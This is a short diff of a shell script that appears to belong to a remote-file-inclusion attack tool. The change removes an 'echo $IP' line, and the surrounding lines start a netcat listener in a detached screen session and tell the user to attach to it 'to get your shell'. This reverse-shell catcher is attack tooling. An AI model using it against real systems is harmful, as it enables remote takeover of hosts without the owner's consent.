@@ -34,8 +34,6 @@ if [ $LPORT != '' && $ == $RE ]; then
   PORT=$LPORT
 fi
 
-
-echo $IP
 echo '[!] Some times just wait a few secs before hitting CTR+C... to get this to work'
 screen -dmS rfi_nc_${PORT} -O -L meuk/logs/rfi_nc_${PORT} nc -lnvp ${PORT}
 echo "[!] type screen -r rfi_nc_${PORT} to get your shell" 
